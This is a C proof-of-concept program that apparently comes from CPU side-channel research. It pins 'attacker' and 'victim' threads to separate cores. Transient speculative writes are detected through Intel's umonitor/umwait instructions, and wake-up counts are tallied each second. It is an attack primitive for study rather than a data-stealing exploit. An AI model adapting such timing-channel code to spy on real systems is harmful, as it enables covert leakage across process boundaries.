#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <immintrin.h>
#include <signal.h>
#include "cacheutils.h"

#define CORE_VICTIM 1
#define CORE_ATTACKER 0

#define OFFSET (64 * 21)
#define INSTR_MONITOR asm volatile("umonitor %%rax" : : "a"(test+OFFSET), "c"(0), "d"(0));
#define INSTR_WAIT asm volatile("xor %%rbx, %%rbx; umwait %%rcx; jnc 1f; inc %%rbx; 1: nop" : "=b"(carry) : "a"(-1), "d"(-1), "c"(0));


volatile int running = 1;

void pin_to_core(int core) {
    cpu_set_t cpuset;
    pthread_t thread;

    thread = pthread_self();

    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);

    pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
}

void write_speculative2(void* ptr, int value) {
    speculation_start(s);
    *(char*)ptr = 3;
    speculation_end(s);
}

__attribute__((aligned(4096))) char test[4096 * 256];


void* keystroke_thread(void* dummy) {
    pin_to_core(CORE_ATTACKER);
    printf("[~] Waiting for keypress (PID: %d)\n", getpid());
    test[OFFSET] = 1;

    while(1) {
        getchar();
        printf("[+] Do the transient writes!\n");
        asm volatile("mfence");
        size_t c = 0;
        while(1) {
            write_speculative2(test + OFFSET, 2); // speculative write to address, triggers
        }
        asm volatile("mfence");
    }

}

volatile size_t cnt = 0, cnt_carry = 0;

void sigalarm(int num) {
    printf("Count: %zd (Carry: %zd)\n", cnt, cnt_carry);
    cnt = 0;
    cnt_carry = 0;
    alarm(1);
}

/* Application entry */
int main(int argc, char *argv[]) {
    
    pthread_t p;
    pthread_create(&p, NULL, keystroke_thread, NULL);
    sched_yield();

    pin_to_core(CORE_VICTIM);

    memset(test, 1, sizeof(test));
    signal(SIGALRM, sigalarm);
    alarm(1);
    signal(SIGSEGV, trycatch_segfault_handler);


    while(1) {
        INSTR_MONITOR
        size_t carry = 0;
        INSTR_WAIT
        cnt_carry += carry;

        // verify that there was no architectural modification
        if(test[OFFSET] != 1) {
            printf("Oh no!\n");
        }
        cnt++;
    }


    return 0;
}